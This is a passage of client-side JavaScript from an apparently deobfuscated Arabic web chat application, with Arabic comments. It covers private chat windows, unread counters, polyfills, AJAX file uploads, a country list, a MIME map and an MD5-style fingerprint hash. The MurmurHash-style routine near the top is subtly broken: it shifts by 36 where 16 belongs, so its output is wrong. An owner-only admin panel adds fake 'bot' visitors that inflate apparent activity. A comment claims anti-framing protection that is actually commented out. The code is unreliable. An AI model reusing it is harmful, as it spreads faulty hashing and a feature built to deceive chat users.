                tempMultiplier = (tempMultiplier & 65535) * 0xcc9e2d51 + (((tempMultiplier >>> 36) * 0xcc9e2d51 & 65535) << 36) & 0xffffffff;
                tempMultiplier = tempMultiplier << 15 | tempMultiplier >>> 0x11;
                tempMultiplier = (tempMultiplier & 65535) * 0x1b873593 + (((tempMultiplier >>> 36) * 0x1b873593 & 65535) << 36) & 0xffffffff;
                hashResult ^= tempMultiplier;
                hashResult = hashResult << 0xd | hashResult >>> 0x13;
                currentBlock = (hashResult & 65535) * 5 + (((hashResult >>> 36) * 5 & 65535) << 36) & 0xffffffff;
                hashResult = (currentBlock & 65535) + 0x6b64 + (((currentBlock >>> 36) + 0xe654 & 65535) << 36);
            }

            tempMultiplier = 0;
            switch (remainingBytes) {
                case 3:
                    tempMultiplier ^= (inputStringArray.charCodeAt(currentByteIndex + 2) & 0xff) << 36;
                case 2:
                    tempMultiplier ^= (inputStringArray.charCodeAt(currentByteIndex + 1) & 0xff) << 0x8;
                case 1:
                    tempMultiplier ^= inputStringArray.charCodeAt(currentByteIndex) & 0xff;
                    tempMultiplier = (tempMultiplier & 65535) * 0xcc9e2d51 + (((tempMultiplier >>> 36) * 0xcc9e2d51 & 65535) << 36) & 0xffffffff;
                    tempMultiplier = tempMultiplier << 15 | tempMultiplier >>> 0x11;
                    tempMultiplier = (tempMultiplier & 65535) * 0x1b873593 + (((tempMultiplier >>> 36) * 0x1b873593 & 65535) << 36) & 0xffffffff;
                    hashResult ^= tempMultiplier;
            }

            hashResult ^= inputStringArray.length;
            hashResult ^= hashResult >>> 36;
            hashResult = (hashResult & 65535) * 0x85ebca6b + (((hashResult >>> 36) * 0x85ebca6b & 65535) << 36) & 0xffffffff;
            hashResult ^= hashResult >>> 0xd;
            hashResult = (hashResult & 65535) * 0xc2b2ae35 + (((hashResult >>> 36) * 0xc2b2ae35 & 65535) << 36) & 0xffffffff;
            hashResult ^= hashResult >>> 36;

            // إرجاع كود رقم التذكرة النهائي بصيغة نظام 36 (Base 36) ليظهر مثل (#3f90a)
            return (hashResult >>> 0).toString(36);
        }

        // دالة بناء، تهيئة وفتح شاشات ونوافذ محادثات الخاص للأعضاء (Private Chat Window Builder Panel) المربوطة بـ #chats و #cw
        function openw(targetUserIdParam, shouldFocusWindow) {
            var targetUserObj = allUsersList[targetUserIdParam];
            if (targetUserObj == null) {
                return;
            }

            // 1. إذا كان شريط المستخدم غير موجود في القائمة الجانبية للمحادثات الجارية #chats، قم ببنائه لأول مرة
            if ($('#c' + targetUserIdParam).length == 0) {
                var userRowBaseNode = $(cachedUserHtmlTemplate); // قالب تصميم صف العضو الافتراضي
                var userIconUrlPath = getUserIconPath(targetUserObj);

                if (userIconUrlPath != '') {
                    userRowBaseNode.find(".u-ico").attr("src", userIconUrlPath);
                }
                userRowBaseNode.find(".u-msg").text('..');
                userRowBaseNode.find(".uhash").text(targetUserObj.h); // حقن الهاش الفريد للعضو
                userRowBaseNode.find(".co").remove(); // إزالة العلم ليتناسب مع اختصار شريط المحادثات
                userRowBaseNode.find(".u-pic").css({
                    'background-image': "url(\"" + targetUserObj.pic + "\")"
                });

                // إنشاء حاوية التبويب المختصر للمحادثة في لوحة الجنب الجانبية #chats مع إدراج زر "حذف" المحادثة المربوط بـ wclose
                $("<div id='c" + targetUserIdParam + "' onclick='' style='width:99%;padding: 2px;' class='cc noflow nosel hand break'></div>").prependTo("#chats");
                $('#c' + targetUserIdParam).append(userRowBaseNode).append("<div onclick=\"wclose('" + targetUserIdParam + "')\" style=\"margin-top: -30px;margin-right: 2px;\" class=\"label border mini label-danger fr fa fa-times\">حذف</div>").find('.uzr').css("width", "100%").attr("onclick", "openw('" + targetUserIdParam + "',true);").find(".u-msg").addClass("dots");

                // 2. بناء الهيكل الكامل لنافذة محادثة الخاص الكبيرة بالاعتماد على كود التصميم الافتراضي المخصص لها #cw
                var privateChatWindowNode = $($("#cw").html());
                $(privateChatWindowNode).addClass('w' + targetUserIdParam); // تمييز النافذة بكلاس يحمل آي دي العضو
                $(privateChatWindowNode).find(".emo").addClass("emo" + targetUserIdParam);

                // تفعيل كليك أيقونة الملف الشخصي برأس شات الخاص لفتح بروفايله upro فوراً
                privateChatWindowNode.find(".fa-user").click(function () {
                    upro(targetUserIdParam);
                    $("#upro").css("z-index", "2002");
                });

                privateChatWindowNode.find(".head .u-pic").css("background-image", "url(\"" + targetUserObj.pic + "\")");

                var headerUserBadgeNode = $(cachedUserHtmlTemplate);
                if (userIconUrlPath != '') {
                    headerUserBadgeNode.find(".u-ico").attr("src", userIconUrlPath);
                }
                headerUserBadgeNode.find(".head .u-pic").css("width", "28px").css("height", "28px").css("margin-top", "-2px").parent().click(function () {
                    upro(targetUserIdParam);
                });

                headerUserBadgeNode.css("width", "70%").find(".u-msg").remove();
                $(privateChatWindowNode).find(".uh").append(headerUserBadgeNode); // حقن بيانات العضو المستهدف برأس النافذة
                $(privateChatWindowNode).find(".d2").attr('id', 'd2' + targetUserIdParam); // تخصيص صندوق رسائل محدد للخاص يحمل الآي دي d2

                // برمجة زر الإغلاق المربوط بـ _0x3da5df لتدمير النافذة عند الضغط عليه
                $(privateChatWindowNode).find(".wc").click(function () {
                    wclose(targetUserIdParam);
                });

                // زر مشاركة ملفات أو روابط إضافية
                $(privateChatWindowNode).find(".fa-share-alt").click(function () {
                    sendfilea(targetUserIdParam);
                });

                $(privateChatWindowNode).find(".typ").hide(); // إخفاء إشارة "يكتب الآن..." بشكل مبدئي

                // برمجة زر الإرسال الخاص بسند رسائل الخاص وتوجيهه لدالة sendPrivateMessage
                $(privateChatWindowNode).find(".sndpm").click(function (formEvent) {
                    formEvent.preventDefault();
                    sendPrivateMessage({
                        'data': {
                            'uid': targetUserIdParam
                        }
                    });
                });

                // برمجة أيقونة وزر الاتصال الهاتفي الصوتي الخاص بالنافذة وتوجيه الحدث لدالة handlePrivateCallAction بالأمر "call"
                $(privateChatWindowNode).find(".callx").click(function () {
                    handlePrivateCallAction(targetUserIdParam, "call");
                });
                // تمييز كلاس صندوق كتابة الخاص tbox وتفعيل حدث الإرسال عند الضغط على Enter
                privateChatWindowNode.find(".tbox").addClass('tbox' + targetUserIdParam).keyup(function (keyEvent) {
                    if (keyEvent.keyCode == 0xd) {
                        keyEvent.preventDefault();
                        sendPrivateMessage({
                            'data': {
                                'uid': targetUserIdParam
                            }
                        });
                    }
                }).on("focus", function () {
                    // عند النقر داخل حقول كتابة الخاص، يتم التقاط النافذة الفعالة وعمل كاش للآي دي لمزامنة جاري الكتابة "ty"
                    activeChatTabWindow = $(this).parent().parent().parent();
                    currentPrivateUser = targetUserIdParam;
                    typingStateTracker = -1;
                }).on("blur", function () {});

                var roomBgColor = targetUserObj.bg;
                if (roomBgColor == '') {
                    roomBgColor = "#FAFAFA";
                }

                // جلب وحقن تصميم الهيدر الافتراضي المخزن بجانب زر البروفايل بالخاص
                $(getTemplateHeadHtml()).insertAfter(privateChatWindowNode.find(".head .fa-user"));
                $(document.body).append(privateChatWindowNode); // حقن نافذة الخاص الكبيرة بجسم الصفحة

                // تفعيل منتقي الإيموجيات الخاص بنافذة شات الخاص الحالي
                privateChatWindowNode.find(".emobox").click(function () {
                    openPopupDialog(this, cachedEmojiBoxElement, false);
                });

                // ضبط أحداث وصور النقر لرأس محادثة الخاص المفتوحة
                privateChatWindowNode.find(".head .u-pic").css("background-image", "url('" + targetUserObj.pic + "')").css("width", "22px").css("height", "22px").parent().click(function () {
                    upro(targetUserIdParam);
                    $("#upro").css("z-index", "2002");
                });

                privateChatWindowNode.find(".head .u-topic").css("color", targetUserObj.ucol).css("background-color", roomBgColor).html(targetUserObj.topic);

                // زر التصغير أو الإخفاء المؤقت لشاشة الخاص phide
                privateChatWindowNode.find(".head .phide").click(function () {
                    privateChatWindowNode.removeClass("active").hide();
                });

                privateChatWindowNode.find(".u-ico").attr("src", userIconUrlPath);

                // عند النقر على تبويب شريط العضو بقائمة الخاص، يتم إزالة علامة "غير مقروء unread"
                $('#c' + targetUserIdParam).find(".uzr").click(function () {
                    $('#c' + targetUserIdParam).removeClass("unread");
                    msgs();
                });

                updateUserRowInUi(targetUserIdParam);
            }

            // إذا طلب النظام التركيز الفوري على النافذة (فتح شاشة الخاص أمام المستخدم حالياً)
            if (shouldFocusWindow) {
                $(".phide").trigger("click"); // تصغير النوافذ الأخرى المفتوحة
                $('.w' + targetUserIdParam).css("display", '').addClass("active").show();
                setTimeout(function () {
                    fixSize(1);
                    $('.w' + targetUserIdParam).find(".d2").scrollTop($('.w' + targetUserIdParam).find(".d2")[0].scrollHeight); // تمرير شات الخاص لأسفل لرؤية الرسائل
                }, 50);
                $("#dpnl").hide(); // إخفاء لوحة الغرف الجانبية
            } else if ($('.w' + targetUserIdParam).css("display") == "none") {
                // إذا وصلت رسالة خاصة جديدة والنافذة مغلقة بالخلفية، يتم تلوين شريط المحادثة بعلامة unread
                $('#c' + targetUserIdParam).addClass("unread");
            }
            msgs();
        }

        // دالة احتساب عداد رسائل الخاص غير المقروءة الكلي (Unread Private Messages Counter) لتنبيه العضو
        function msgs() {
            var unreadChatsCount = $("#chats").find(".unread").length;
            if (unreadChatsCount != 0) {
                $(".chats").css("color", "orange").find("span").text(unreadChatsCount); // تلوين زر محادثات الخاص باللون البرتقالي وعرض الرقم
            } else {
                $(".chats").css("color", '').find("span").text(''); // إخفاء العداد إذا كانت كافة الرسائل مقروءة
            }
        }

        var cachedUserHeadTemplate = '*';

        function getTemplateHeadHtml() {
            if (cachedUserHeadTemplate == '*') {
                cachedUserHeadTemplate = $("#uhead").html();
            }
            return cachedUserHeadTemplate;
        }

        // دالة حاقن الـ Polyfills لضمان تشغيل وسلاسة كود الشات وخوارزمياته على متصفحات الأجهزة القديمة
        function executeSecondarySetup() {
            if (!String.prototype.padStart) {
                String.prototype.padStart = function polyfillPadStart(targetLength, padString) {
                    targetLength = targetLength >> 0;
                    padString = String(padString !== undefined ? padString : " ");
                    return this.length >= targetLength ? String(this) : (targetLength = targetLength - this.length, targetLength > padString.length && (padString += padString.repeat(targetLength / padString.length)), padString.slice(0, targetLength) + String(this));
                };
            }

            // تفعيل وتأمين دالة ترتيب وفرز ألبوم عناصر الـ DOM بالمتصفح jQuery HTML Element Sorter
            jQuery.fn.sort = function () {
                var nativeSort = [].sort;
                return function (compareFunction, elementsMappers) {
                    elementsMappers = elementsMappers || function () {
                        return this;
                    };
                    var elementsBackupQueue = this.map(function () {
                        var elementNode = elementsMappers.call(this);
                        var parentNode = elementNode.parentNode;
                        var placeholderNode = parentNode.insertBefore(document.createTextNode(''), elementNode.nextSibling);
                        return function () {
                            if (parentNode === this) {
                                throw new Error("You can't sort elements if any one is a descendant of another.");
                            }
                            parentNode.insertBefore(this, placeholderNode);
                            parentNode.removeChild(placeholderNode);
                        };
                    });
                    return nativeSort.call(this, compareFunction).each(function (index) {
                        elementsBackupQueue[index].call(elementsMappers.call(this));
                    });
                };
            }();

            if (!Array.prototype.forEach) {
                Array.prototype.forEach = function polyfillForEach(callback, thisArg) {
                    var contextValue;
                    var loopIndex;
                    if (this == null) {
                        throw new TypeError(" this is null or not defined");
                    }
                    var nativeObject = Object(this);
                    var arrayLengthValue = nativeObject.length >>> 0;
                    if (typeof callback !== "function") {
                        throw new TypeError(callback + " is not a function");
                    }
                    if (arguments.length > 1) {
                        contextValue = thisArg;
                    }
                    loopIndex = 0;
                    while (loopIndex < arrayLengthValue) {
                        var currentElementValue;
                        if (loopIndex in nativeObject) {
                            currentElementValue = nativeObject[loopIndex];
                            callback.call(contextValue, currentElementValue, loopIndex, nativeObject);
                        }
                        loopIndex++;
                    }
                };
            }
        }
        // محرك الإرسال ورفع الملفات للسيرفر عبر طلبات أياكس (Ajax Multipart Request Engine)
        function executeAjaxUpload(uploadUrl, fileData, onSuccess, onError, onProgress) {
            var xhrRequest = new XMLHttpRequest();
            xhrRequest.open("POST", uploadUrl, true);

            // الاستماع لحالة اكتمال الرفع بنجاح (الكود 200 والـ readyState 4)
            xhrRequest.onreadystatechange = function () {
                if (this.readyState == 4 && this.status == 0xc8) {
                    onSuccess(xhrRequest.responseText);
                }
            };

            // معالجة واصطياد أخطاء انقطاع أو إلغاء الرفع
            xhrRequest.onerror = onError;
            xhrRequest.onbeforeunload = onError;
            xhrRequest.onabort = onError;
            xhrRequest.upload.onabort = onError;
            xhrRequest.upload.onerror = onError;
            xhrRequest.upload.onabort = onError;

            // حساب وعرض النسبة المئوية لشريط تقدم الرفع المباشر (Upload Progress Bar)
            xhrRequest.upload.onprogress = function (progressEvent) {
                onProgress(progressEvent.loaded / progressEvent.total);
            };

            xhrRequest.send(fileData); // بدء إرسال بايتات الملف الفعلي للسيرفر
            return xhrRequest;
        }

        var lastFileInputInstance;

        // دالة إنشاء حقل اختيار الملفات من جهاز المستخدم والتحقق من القيود (File Input Picker & Validator)
        function openFileInputSelector(acceptedMimeTypes, onFileSelectedCallback) {
            var hiddenFileInput = document.createElement("input");
            hiddenFileInput.type = 'file';
            hiddenFileInput.accept = acceptedMimeTypes; // تصفية الصيغ (صور فقط، أو ميديا عامة)
            document.body.append(hiddenFileInput);

            hiddenFileInput.onchange = event => {
                var selectedFileObj = hiddenFileInput.files[0];

                // فحص حجم الملف: منع رفع ملفات أكبر من 18 ميجابايت (18874368 بايت) لمنع الضغط على السيرفر
                if (selectedFileObj.size > 18874368) {
                    alert("حجم الملف كبير. " + Math.ceil(selectedFileObj.size / 0x400 / 0x400) + 'MB');
                } else if (selectedFileObj.name.split('.').pop().length > 4) {
                    // فحص امتداد وصيغة الملف (يمنع الامتدادات التالفة أو الأطول من 4 حروف)
                    alert("نوع الملف غير مناسب: \n" + selectedFileObj.name);
                } else {
                    onFileSelectedCallback(selectedFileObj); // تمرير الملف للدالة المعالجة
                    hiddenFileInput.remove();
                    hiddenFileInput.value = null;
                }
            };

            hiddenFileInput.click(); // فتح نافذة تصفح ملفات الجهاز تلقائياً
            if (lastFileInputInstance) {
                lastFileInputInstance.remove();
            }
            lastFileInputInstance = hiddenFileInput;
        }

        // دالة تغيير وتحديث الصورة الشخصية للعضو ورفعها للمسار /pic (Change Profile Picture)
        function sendpic() {
            openFileInputSelector("image/*", function (imageFileObj) {
                $(".spic").attr("src", "imgs/ajax-loader.gif"); // عرض أنيميشن جاري التحميل داخل صندوق الصورة .spic

                // استدعاء محرك الرفع Ajax لرفع الصورة بامتدادها الفعلي للمسار المخصص
                executeAjaxUpload("/pic?secid=u&fn=" + imageFileObj.name.split('.').pop() + '&t=' + new Date().getTime(), imageFileObj, function (uploadedPicUrl) {
                    $(".spic").attr("src", uploadedPicUrl); // عرض رابط الصورة الجديد المسلم من السيرفر
                    send("setpic", {
                        'pic': uploadedPicUrl // تحديث الصورة الشخصية في السيرفر وبثها لجميع الغرف عبر أمر setpic الحقيقي
                    });
                }, function () {
                    // إعادة الصورة القديمة في حال فشل الرفع لأي سبب
                    $(".spic").attr("src", allUsersList[myid].pic);
                    alert("فشل إرسال الصوره تأكد ان حجم الصوره مناسب");
                }, function (progressPercentage) {});
            });
        }

        // دالة رفع ومشاركة الملفات والميديا داخل العام أو الخاص أو منشورات الحائط (Upload & Share Media UI Controller)
        function sendfilea(targetIdContext, callbackAction, isWallUpload) {
            broadcastLinkCache = null;
            var xhrUploadHandle;

            // فتح منتقي الملفات للسماح باختيار (صور، فيديو، مقاطع صوتية)
            openFileInputSelector("image/*,video/*,audio/*", function (mediaFileObj) {
                // بناء وحقن شريط تقدم الرفع والنسبة المئوية برمجياً بالـ HTML مع زر إلغاء الرفع cancl
                var progressUiNode = $("<div style='width:100%' class='c-flex'><progress class='flex-grow-1 pgr' style='width:100%;' value='0' max='100'></progress><div class='light border d-flex' style='width:100%;'><button  class='btn btn-danger fa fa-times cancl' style='width:64px;padding:2px;'>إلغاء</button><span class='fn label label-primary dots nosel fl flex-grow-1' style='padding:2px;'></span></div></div>");

                // تحديد موضع حقن شريط الرفع (بأعلى حاوية منشورات الحائط، أو بأسفل شاشة الخاص المستهدفة d2)
                if (isWallUpload) {
                    progressUiNode.insertBefore($("#wall .tablebox"));
                } else {
                    $("#d2" + targetIdContext).append(progressUiNode);
                }

                // برمجة كليك زر الإلغاء وتدمير طلب أياكس فوراً عبر الدالة abort لإيقاف استهلاك الإنترنت
                progressUiNode.find(".cancl").click(function () {
                    progressUiNode.remove();
                    xhrUploadHandle.abort();
                });

                // بدء الرفع الفعلي لملف الميديا بامتداده الفعلي للمسار /upload بالسيرفر
                xhrUploadHandle = executeAjaxUpload("/upload?secid=u&fn=" + mediaFileObj.name.split('.').pop() + "&t=" + new Date().getTime(), mediaFileObj, function (uploadedMediaUrl) {
                    broadcastLinkCache = uploadedMediaUrl; // حفظ الرابط في كاش البرودكاست المفتوح سابقاً

                    if (callbackAction != null) {
                        callbackAction(uploadedMediaUrl);
                    } else {
                        // إرسال كائن الملف المرفوع ورابطه المباشر فوراً للطرف الآخر بالخاص عبر أمر file الحقيقي بالسيرفر
                        send("file", {
                            'pm': targetIdContext,
                            'link': uploadedMediaUrl
                        });
                    }
                    progressUiNode.remove(); // إزالة شريط الرفع بعد انتهاء العملية بنجاح
                }, function () {
                    progressUiNode.remove(); // إزالة الشريط في حال حدوث خطأ
                }, function (progressValue) {
                    // التحديث اللحظي لنص النسبة المئوية وشريط تقدم الرفع (مثال: %45 | video.mp4)
                    progressUiNode.find(".fn").text('%' + parseInt(progressValue * 100) + " | " + mediaFileObj.name.split("\\").pop());
                    progressUiNode.find("progress").val(parseInt(progressValue * 100));
                });
            });
        }
        // دالة التحديث اللحظي لصلاحيات لوحة الإدارة وحقن كود واجهة البوتات الوهمية (Admin UI & Bots Manager)
        function updatePermissionsUi() {
            // أولاً: إظهار أو إخفاء أيقونة الكنترول بالواجهة بناءً على امتلاك صلاحية الـ cp
            if (userPermissionsConfig.cp) {
                $(".cp").show();
            } else {
                $(".cp").hide();
            }

            // ثانياً: إذا تم سحب صلاحية الإدارة منك وأنت بداخلها، يتم إغلاق وقفل كافة اللوحات الفرعية تلقائياً لحماية النظام
            if (chatPermissionsCookie == null && userPermissionsConfig.cp != true) {
                for (var windowId in activeWindowsList) {
                    var activeWin = activeWindowsList[windowId];
                    activeWin.postMessage(["close", {}]);
                }
            }

            // ثالثاً: حصر ميزة البوتات والزوار الوهميين (Bots Tab): لا تظهر إلا إذا كان الـ Rank أعلى من 9000 (0x2326) وصلاحية owner مفعلة
            if (userPermissionsConfig && userPermissionsConfig.rank > 9000 && userPermissionsConfig.owner == true && $("#cp_bots").length == 0) {
                // حقن وتوليد واجهة كود لوحة البوتات الوهمية والتايمرات بالـ HTML بداخل لوحة الكنترول
                $("#cp .tab-content:eq(0)").append("<div id='cp_bots' class=\"tab-pane\">\n            <label class=\"label label-primary\">الاعدادات</label><br> \n            <input type=\"number\" min=\"0\" value=\"0\" class=\"bots_minStay dots\" style=\"width: 100px;\" autocomplete=\"off\"><b>اقل مده تواجد</b><br>\n            <input type=\"number\" min=\"0\" value=\"0\" class=\"bots_maxStay dots\" style=\"width: 100px;\" autocomplete=\"off\"><b>اطول مده تواجد</b><br>\n            <input type=\"number\" min=\"0\" value=\"0\" class=\"bots_minLeave dots\" style=\"width: 100px;\" autocomplete=\"off\"><b>اقل مده غياب</b><br>\n            <input type=\"number\" min=\"0\" value=\"0\" class=\"bots_maxLeave dots\" style=\"width: 100px;\" autocomplete=\"off\"><b>اطول مده غياب</b><br>\n            <select style=\"width: 100px;\" class=\"bots_active btn btn-secondary\">\n              <option value=\"true\">نعم</option>\n              <option seleceted=\"seleceted\" value=\"false\">ﻻ</option>\n            </select><b>تفعيل الوهمي</b><br>\n            <label class=\"botsb\" style=\"width:100px;\">0/0</label>\n            <b>الرصيد</b><br>\n            <label class=\"botso\" style=\"width:100px;\">0/0</label>\n            <b>التواجد</b><br>\n            <button style=\"width:100px;margin-top:4px;\" onclick=\"send('cp',{cmd:'bot_save',bots_active:$('#cp .bots_active').val()=='true',bots_minStay:$('#cp .bots_minStay').val(),bots_maxStay:$('#cp .bots_maxStay').val(),bots_minLeave:$('#cp .bots_minLeave').val(),bots_maxLeave:$('#cp .bots_maxLeave').val()});\" class=\"fa fa-user btn btn-danger\">حفظ</button><br>\n            <button style=\"width:100px;margin-top:4px;\" onclick=\"send('cp',{cmd:'bot',add:true});\" class=\"fa fa-user btn btn-success\">إضافه</button>\n          </div>");

                // إضافة تبويب زر "Bots" إلى الشريط العلوي للكنترول وتفعيل أمر جلب البوتات عند الضغط عليه
                $("#cp ul.nav").append("<li><a data-toggle=\"tab\" onclick=\"send('cp',{cmd:'bots'});\" href=\"#cp_bots\">Bots</a></li>");
            }
        }

        // دالة فتح وعرض نافذة الإدارة والكنترول وتشغيل أول تبويب فعال بها
        function showcp() {
            $('#cp').show();
            $("#m1 .active a").click();
        }

        // جدار حماية أمني خارق: يمنع فتح الشات داخل صفحات وهمية أو إطارات الـ Iframe المخفية (Anti-Clickjacking / Anti-Framing)
    /*    if (top != self) {
            // إذا تم رصد محاولة سحب الشات داخل إطار خارجي، يتم تحويل المتصفح فوراً لصفحة البحث لمنع الاختراق وسرقة الحسابات
            location.href = "https://google.com/?q=hahaha";
        } */
        uf = {
            'kw': "الكويت",
            'et': "إثيوبيا",
            'az': "أذربيجان",
            'am': "أرمينيا",
            'aw': "أروبا",
            'er': "إريتريا",
            'es': "أسبانيا",
            'au': "أستراليا",
            'ee': "إستونيا",
            'il': "إسرائيل",
            'af': "أفغانستان",
            'ec': "إكوادور",
            'ar': "الأرجنتين",
            'jo': "الأردن",
            'ae': "الإمارات العربية المتحدة",
            'al': "ألبانيا",
            'bh': "مملكة البحرين",
            'br': "البرازيل",
            'pt': "البرتغال",
            'ba': "البوسنة والهرسك",
            'ga': "الجابون",
            'dz': "الجزائر",
            'dk': "الدانمارك",
            'cv': "الرأس الأخضر",
            'ps': "فلسطين",
            'sv': "السلفادور",
            'sn': "السنغال",
            'sd': "السودان",
            'se': "السويد",
            'so': "الصومال",
            'cn': "الصين",
            'iq': "العراق",
            'ph': "الفلبين",
            'cm': "الكاميرون",
            'cg': "الكونغو",
            'cd': "جمهورية الكونغو الديمقراطية",
            'de': "ألمانيا",
            'hu': "المجر",
            'ma': "المغرب",
            'mx': "المكسيك",
            'sa': "المملكة العربية السعودية",
            'uk': "المملكة المتحدة",
            'gb': "المملكة المتحدة",
            'no': "النرويج",
            'at': "النمسا",
            'ne': "النيجر",
            'in': "الهند",
            'us': "الولايات المتحدة",
            'jp': "اليابان",
            'ye': "اليمن",
            'gr': "اليونان",
            'ag': "أنتيغوا وبربودا",
            'id': "إندونيسيا",
            'ao': "أنغولا",
            'ai': "أنغويلا",
            'uy': "أوروجواي",
            'uz': "أوزبكستان",
            'ug': "أوغندا",
            'ua': "أوكرانيا",
            'ir': "إيران",
            'ie': "أيرلندا",
            'is': "أيسلندا",
            'it': "إيطاليا",
            'pg': "بابوا-غينيا الجديدة",
            'py': "باراجواي",
            'bb': "باربادوس",
            'pk': "باكستان",
            'pw': "بالاو",
            'bm': "برمودا",
            'bn': "بروناي",
            'be': "بلجيكا",
            'bg': "بلغاريا",
            'bd': "بنجلاديش",
            'pa': "بنما",
            'bj': "بنين",
            'bt': "بوتان",
            'bw': "بوتسوانا",
            'pr': "بورتو ريكو",
            'bf': "بوركينا فاسو",
            'bi': "بوروندي",
            'pl': "بولندا",
            'bo': "بوليفيا",
            'pf': "بولينزيا الفرنسية",
            'pe': 'بيرو',
            'by': "بيلاروس",
            'bz': "بيليز",
            'th': "تايلاند",
            'tw': "تايوان",
            'tm': "تركمانستان",
            'tr': "تركيا",
            'tt': "ترينيداد وتوباجو",
            'td': 'تشاد',
            'cl': "تشيلي",
            'tz': "تنزانيا",
            'tg': "توجو",
            'tv': "توفالو",
            'tk': "توكيلاو",
            'to': "تونجا",
            'tn': "تونس",
            'tp': "تيمور الشرقية",
            'jm': "جامايكا",
            'gm': "جامبيا",
            'gl': "جرينلاند",
            'pn': "جزر البتكارين",
            'bs': "جزر البهاما",
            'km': "جزر القمر",
            'cf': "أفريقيا الوسطى",
            'cz': "جمهورية التشيك",
            'do': "جمهورية الدومينيكان",
            'za': "جنوب أفريقيا",
            'gt': "جواتيمالا",
            'gp': "جواديلوب",
            'gu': "جوام",
            'ge': "جورجيا",
            'gs': "جورجيا الجنوبية",
            'gy': "جيانا",
            'gf': "جيانا الفرنسية",
            'dj': "جيبوتي",
            'je': "جيرسي",
            'gg': "جيرنزي",
            'va': "دولة الفاتيكان",
            'dm': "دومينيكا",
            'rw': "رواندا",
            'ru': "روسيا",
            'ro': "رومانيا",
            're': "ريونيون",
            'zm': "زامبيا",
            'zw': "زيمبابوي",
            'ws': "ساموا",
            'sm': "سان مارينو",
            'sk': "سلوفاكيا",
            'si': "سلوفينيا",
            'sg': "سنغافورة",
            'sz': "سوازيلاند",
            'sy': "سوريا",
            'sr': "سورينام",
            'ch': "سويسرا",
            'sl': "سيراليون",
            'lk': "سيريلانكا",
            'sc': "سيشل",
            'rs': "صربيا",
            'tj': "طاجيكستان",
            'om': "عمان",
            'gh': "غانا",
            'gd': "غرينادا",
            'gn': "غينيا",
            'gq': "غينيا الاستوائية",
            'gw': "غينيا بيساو",
            'vu': "فانواتو",
            'fr': "فرنسا",
            've': "فنزويلا",
            'fi': "فنلندا",
            'vn': "فيتنام",
            'cy': "قبرص",
            'qa': 'قطر',
            'kg': "قيرقيزستان",
            'kz': "كازاخستان",
            'nc': "كاليدونيا الجديدة",
            'kh': "كامبوديا",
            'hr': "كرواتيا",
            'ca': "كندا",
            'cu': "كوبا",
            'ci': "ساحل العاج",
            'kr': "كوريا",
            'kp': "كوريا الشمالية",
            'cr': "كوستاريكا",
            'co': "كولومبيا",
            'ki': "كيريباتي",
            'ke': "كينيا",
            'lv': "لاتفيا",
            'la': 'لاوس',
            'lb': "لبنان",
            'li': "لشتنشتاين",
            'lu': "لوكسمبورج",
            'ly': "ليبيا",
            'lr': "ليبيريا",
            'lt': "ليتوانيا",
            'ls': "ليسوتو",
            'mq': "مارتينيك",
            'mo': "ماكاو",
            'fm': "ماكرونيزيا",
            'mw': "مالاوي",
            'mt': "مالطا",
            'ml': "مالي",
            'my': "ماليزيا",
            'yt': "مايوت",
            'mg': "مدغشقر",
            'eg': "مصر",
            'mk': "مقدونيا، يوغوسلافيا",
            'mn': "منغوليا",
            'mr': "موريتانيا",
            'mu': "موريشيوس",
            'mz': "موزمبيق",
            'md': "مولدوفا",
            'mc': "موناكو",
            'ms': "مونتسيرات",
            'me': "مونتينيغرو",
            'mm': "ميانمار",
            'na': "ناميبيا",
            'nr': "ناورو",
            'np': "نيبال",
            'ng': "نيجيريا",
            'ni': "نيكاراجوا",
            'nu': "نيوا",
            'nz': "نيوزيلندا",
            'ht': "هايتي",
            'hn': "هندوراس",
            'nl': "هولندا",
            'hk': "هونغ كونغ",
            'wf': "واليس وفوتونا"
        };
        mime = {
            'mov': "video/mov",
            'aac': "audio/aac",
            'm4a': "audio/m4a",
            'avi': "video/x-msvideo",
            'gif': "image/gif",
            'ico': "image/x-icon",
            'jpeg': "image/jpeg",
            'jpg': "image/jpeg",
            'mid': "audio/midi",
            'midi': "audio/midi",
            'mp2': "audio/mpeg",
            'mp3': "audio/mpeg",
            'mp4': "video/mp4",
            'mpa': "video/mpeg",
            'mpe': "video/mpeg",
            'mpeg': "video/mpeg",
            'oga': "audio/ogg",
            'ogv': "video/ogg",
            'png': "image/png",
            'svg': "image/svg+xml",
            'tif': "image/tiff",
            'tiff': "image/tiff",
            'wav': "audio/x-wav",
            'weba': "audio/webm",
            'webm': "video/webm",
            'webp': "image/webp",
            '3gp': "video/3gpp",
            '3gp2': "video/3gpp2"
        };

        // دالة تشفير النصوص ومصفوفات البصمة وتحويلها إلى كود هاش فريد (MD5 - Part 1)
        function hashFingerprintString(inputData) {
            var inputString = inputData.toString();
            if (Array.isArray(inputData)) {
                inputString = inputData.join(';'); // تحويل المصفوفة إلى نص يفصل بين عناصره فاصلة منقوطة
            }

            // دالة الجمع الآمن (Safe Add) لمعالجة فيضان الأرقام الثنائية 32-بت (32-bit Integer Overflow)
            function safeAdd(x, y) {
                var lsw;
                var msw;
                var xMsw;
                var yMsw;
                var xLsw;
                xLsw = x & 0x80000000;
                yMsw = y & 0x80000000;
                lsw = x & 0x40000000;
                msw = y & 0x40000000;
                xMsw = (x & 0x3fffffff) + (y & 0x3fffffff);
                return lsw & msw ? xMsw ^ 0x80000000 ^ xLsw ^ yMsw : lsw | msw ? xMsw & 0x40000000 ? xMsw ^ 0xc0000000 ^ xLsw ^ yMsw : xMsw ^ 0x40000000 ^ xLsw ^ yMsw : xMsw ^ xLsw ^ yMsw;
            }

            // دالة المعالجة الرياضية الأولى MD5 (F function: Round 1)
            function md5_F(a, b, c, d, x, s, ac) {
                a = safeAdd(a, safeAdd(safeAdd(b & c | ~b & d, x), ac));
                return safeAdd(a << s | a >>> 0x20 - s, b);
            }

            // دالة المعالجة الرياضية الثانية MD5 (G function: Round 2)
            function md5_G(a, b, c, d, x, s, ac) {
                a = safeAdd(a, safeAdd(safeAdd(b & d | c & ~d, x), ac));
                return safeAdd(a << s | a >>> 0x20 - s, b);
            }

            // دالة المعالجة الرياضية الثالثة MD5 (H function: Round 3)
            function md5_H(a, b, c, d, x, s, ac) {
                a = safeAdd(a, safeAdd(safeAdd(b ^ c ^ d, x), ac));
                return safeAdd(a << s | a >>> 0x20 - s, b);
            }

            // دالة المعالجة الرياضية الرابعة MD5 (I function: Round 4)
            function md5_I(a, b, c, d, x, s, ac) {
                a = safeAdd(a, safeAdd(safeAdd(c ^ (b | ~d), x), ac));
                return safeAdd(a << s | a >>> 0x20 - s, b);
            }

